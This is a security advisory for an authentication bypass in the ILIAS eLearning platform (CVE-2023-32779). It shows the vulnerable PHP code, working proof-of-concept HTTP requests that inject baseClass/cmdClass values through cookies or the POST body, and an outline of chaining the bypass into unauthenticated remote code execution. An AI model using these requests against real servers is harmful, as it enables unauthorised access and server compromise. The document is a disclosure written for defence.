---
layout: post_collection_entry
date:   2023-02-02
categories: [advisory]
advisory_collection: ilias_multi_2023

title:  "[Advisory - ILIAS eLearning platform] Authentication bypass"
advisory:  
  product: ILIAS eLearning platform
  homepage: https://www.ilias.de/en/about-ilias/  
  found: 2023-02-02 
  vulnerable_version: "<= 7.20, <= 8.1"
  fixed_version: "7.21, 8.2"  
  cve: CVE-2023-32779
  impact_text: Medium
  impact_score: 6.5
  cvss: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
---

# Vulnerability overview
During the startup of a request `ILIAS` calls the `resumeUserSession` function to check if there is a valid user.

```php
# FILE: Services\Init\classes\class.ilInitialisation.php
/**
 * Resume an existing user session
 */
public static function resumeUserSession()
{
    global $DIC;
    if (ilAuthUtils::isAuthenticationForced()) {
        ilAuthUtils::handleForcedAuthentication();
    }

    if (
        !$GLOBALS['DIC']['ilAuthSession']->isAuthenticated() or
        $GLOBALS['DIC']['ilAuthSession']->isExpired()
    ) {
        ilLoggerFactory::getLogger('init')->debug('Current session is invalid: ' . $GLOBALS['DIC']['ilAuthSession']->getId());
        $current_script = substr(strrchr($_SERVER["PHP_SELF"], "/"), 1);
        if (self::blockedAuthentication($current_script)) {
            ilLoggerFactory::getLogger('init')->debug('Authentication is started in current script.');
            // nothing todo: authentication is done in current script
            return;
        }

        return self::handleAuthenticationFail();
    }
    // valid session

    return self::initUserAccount();
}
```

If the `ilAuthSession` is not authenticated or expired the function `self::handleAuthenticationFail` would be called and the request aborted. But there are pages, which do not required a valid user session. The function `blockedAuthentication` is called to test, if this is true for the current request.


There are a bunch of checks inside this function. One of them is the following.

```php
# FILE: Services\Init\classes\class.ilInitialisation.php
/**
 * Block authentication based on current request
 *
 * @return boolean
 */
protected static function blockedAuthentication($a_current_script)
{
    // ......
    $requestBaseClass = strtolower((string) $_REQUEST['baseClass']);
    if ($requestBaseClass == strtolower(ilStartUpGUI::class)) {
        $requestCmdClass = strtolower((string) $_REQUEST['cmdClass']);
        if (
            $requestCmdClass == strtolower(ilAccountRegistrationGUI::class) ||
            $requestCmdClass == strtolower(ilPasswordAssistanceGUI::class)
        ) {
            ilLoggerFactory::getLogger('auth')->debug('Blocked authentication for cmdClass: ' . $requestCmdClass);
            return true;
        }
    // ......
```

It checks if the parameter `baseClass` == `ilStartUpGUI` and the `cmdClass` is in [`ilAccountRegistrationGUI`, `ilPasswordAssistanceGUI`]. 
The important detailed about this code is that the value of these parameters is obtained via the superglobal variable `$_REQUEST` (see: [PHP - $_REQUEST](https://www.php.net/manual/en/reserved.variables.request.php)).

> An associative array that by default contains the contents of $_GET, $_POST and $_COOKIE. 

For example there is no valid session required for the following request.

```http 
GET /ilias.php?lang=de&client_id=myilias&cmdClass=ilpasswordassistancegui&cmdNode=zp:sz&baseClass=ilStartUpGUI HTTP/1.1
Host: ilias.local:9080

```

## Request routing
The request routing in `ILIAS` is implemented with the following parameters `baseclass`, `cmdClass`  and `cmd`.

```php
# FILE: ilias.php
<?php
/* Copyright (c) 1998-2009 ILIAS open source, Extended GPL, see docs/LICENSE */

/**
* ilias.php. main script.
*
* If you want to use this script your base class must be declared
* within modules.xml.
*
* @author Alex Killing <alex.killing@gmx.de>
* @version $Id$
*
*/

require_once("Services/Init/classes/class.ilInitialisation.php");
ilInitialisation::initILIAS();

/**
 * @var $DIC \ILIAS\DI\Container
 */
global $DIC, $ilBench;

$DIC->ctrl()->callBaseClass();
$ilBench->save();

```

The implementation of `callBaseClass` creates and calls the base class.

```php
# FILE: Services/UICore/classes/class.ilCtrl.php
/**
 * Calls base class of current request. The base class is
 * passed via $_GET["baseClass"] and is the first class in
 * the call sequence of the request. Do not call this method
 * within other scripts than ilias.php.
 * @throws ilCtrlException
 */
public function callBaseClass()
{
    global $DIC;

    $ilDB = $DIC->database();
    
    $baseClass = strtolower($_GET["baseClass"]);

    $module_class = ilCachedCtrl::getInstance();
    $mc_rec = $module_class->lookupModuleClass($baseClass);
    //....
    // forward processing to base class
    $this->getCallStructure(strtolower($baseClass));
    $base_class_gui = new $class();
    $this->forwardCommand($base_class_gui);
}
```

This function uses the superglobal variable `$_GET` to obtain the value of the key `baseClass`. 

# Proof of concept
As the value of the key `baseClass` can have different values in the superglobal variables `$_GET` and `$_REQUEST` pages can be accessed, which would required a valid user session.

The following request for example redirects to the public page.

```http
GET /ilias.php?baseClass=ilDashboardGUI&cmd=jumpToSelectedItems HTTP/1.1
Host: ilias.local:9080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://ilias.local:9080/login.php?client_id=myilias&cmd=force_login&lang=de
Connection: close
Cookie: ilClientId=myilias; PHPSESSID=Unauth
Upgrade-Insecure-Requests: 1


```

Response:

```http
HTTP/1.1 302 Found
Date: Fri, 28 Apr 2023 05:39:52 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: PHPSESSID=c7058622b3a4df0c5a227effc4aac2f7; path=/; HttpOnly
Location: http://ilias.local:9080/ilias.php?baseClass=ilrepositorygui&reloadpublic=1&cmd=frameset&ref_id=1
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8

```

But by adding the following cookies: `;baseClass=ilStartupGUI;cmdClass=ilPasswordAssistanceGUI` it is possible to bypass (`blockedAuthentication` returns `true`) the auth check and access the `ilDashboardGUI` base class (although an exception is thrown).

```http
GET /ilias.php?baseClass=ilDashboardGUI&cmd=jumpToSelectedItems HTTP/1.1
Host: ilias.local:9080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://ilias.local:9080/login.php?client_id=myilias&cmd=force_login&lang=de
Connection: close
Cookie: ilClientId=myilias; PHPSESSID=Unauth; ;baseClass=ilStartupGUI;cmdClass=ilPasswordAssistanceGUI
Upgrade-Insecure-Requests: 1


```

Response:

```http
HTTP/1.1 302 Found
Date: Fri, 28 Apr 2023 05:40:07 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
P3P: CP="CURa ADMa DEVa TAIa PSAa PSDa IVAa IVDa OUR BUS IND UNI COM NAV INT CNT STA PRE"
Location: http://ilias.local:9080/error.php
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 22403


<td bgcolor='#eeeeec'>Whoops\Run->handleException( <span>$exception = </span><span>class TypeError { protected $message = &#39;Argument 1 passed to DashboardLayoutProvider::{closure}() must be an instance of ILIAS\\UI\\Component\\MainControls\\MainBar, null given, called in /var/www/html/src/GlobalScreen/Scope/Layout/Provider/PagePart/DecoratedPagePartProvider.php on line 75&#39;; private ${Error}string = &#39;&#39;; protected $code = 0; protected $file = &#39;/var/www/html/Services/Dashboard/GlobalScreen/classes/DashboardLayoutProvider.php&#39;; protected $line = 38; private ${Error}trace = [0 =&gt; [...], 1 =&gt; [...], 2 =&gt; [...], 3 =&gt; [...], 4 =&gt; [...], 5 =&gt; [...], 6 =&gt; [...], 7 =&gt; [...], 8 =&gt; [...], 9 =&gt; [...], 10 =&gt; [...], 11 =&gt; [...], 12 =&gt; [...], 13 =&gt; [...], 14 =&gt; [...], 15 =&gt; [...]]; private ${Error}previous = NULL; public $xdebug_message = &#39;&lt;tr&gt;&lt;th align=\&#39;left\&#39; bgcolor=\&#39;#f57900\&#39; colspan=&quot;5&quot;&gt;&lt;span style=\&#39;background-color: #cc0000; color: #fce94f; font-size: x-large;\&#39;&gt;( ! )&lt;/span&gt; TypeError: Argument 1 passed to DashboardLayoutProvider::{closure}() must be an instance of ILIAS\\UI\\Component\\MainControls\\MainBar, null given, called in /var/www/html/src/GlobalScreen/Scope/Layout/Provider/PagePart/DecoratedPagePartProvider.php on line 75 in /var/www/html/Services/Dashboard/GlobalScreen/classes/DashboardLayoutProvider.php on line &lt;i&gt;38&lt;/i&gt;&lt;&#39; }</span>
```

**Note**: 
It can be configured if cookies are used for the `$_REQUEST` variable.

> Note:
> 
> The variables in $_REQUEST are provided to the script via the GET, POST, and COOKIE input mechanisms and therefore could be modified by the remote user and cannot be trusted. The presence and order of variables listed in this array is defined according to the PHP request_order, and variables_order configuration directives.

See: [PHP ini - request_order](https://www.php.net/manual/en/ini.core.php#ini.request-order) and [PHP ini - variables_order](https://www.php.net/manual/en/ini.core.php#ini.variables-order)

## Unauthenticated remote command execution
This vulnerability can be chained with `CVE-2023-32778`, which allows an attacker to execute code on the server, even without valid credentials.

As a first step a new `Portfolio` object has to be created. 

**Note**: 
This request passes the `baseClass` and `cmdClass` via the `POST` body instead of cookies.


```http
POST /ilias.php?new_type=prtf&cmd=post&cmdClass=ilobjportfoliogui&cmdNode=99:ve:p6&baseClass=ilDashboardGUI&rtoken=441c440acdd7ad00179ed6795b42e7f6 HTTP/1.1
Host: ilias.local:9080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 179
Origin: http://ilias.local:9080
Connection: close
Referer: http://ilias.local:9080/ilias.php?new_type=prtf&cmd=post&cmdClass=ilobjportfoliogui&cmdNode=99:ve:p6&baseClass=ilDashboardGUI&rtoken=441c440acdd7ad00179ed6795b42e7f6
Cookie: ilClientId=myilias; PHPSESSID=Unauth;
Upgrade-Insecure-Requests: 1

title=FooBar-Portfolio-unauth&mode=mode_scratch&ptype=page&fpage=FooBar-PortfolioTitle-unauth&blog=&cmd%5Bsave%5D=Erstellen&baseClass=ilStartupGUI&cmdClass=ilPasswordAssistanceGUI
```

The response which redirectes to the new object with ID `404`.

```http
HTTP/1.1 302 Found
Date: Fri, 28 Apr 2023 06:25:00 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: http://ilias.local:9080/ilias.php?prt_id=404&cmd=view&cmdClass=ilobjportfoliogui&cmdNode=99:ve:p6&baseClass=ilDashboardGUI
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8

```

![New portfolio](/assets/ilias-2023/new-portfolio-unauth.png)

Then the following steps have to be done (same as in the referenced advisory):

* Create media object in page
* Upload a ZIP file with the `PHP` code to run
* Unzip the uploaded file
* Get the `mobfs` ID and run the script

For each request the parameters `baseClass=ilStartupGUI&cmdClass=ilPasswordAssistanceGUI` have to be added.

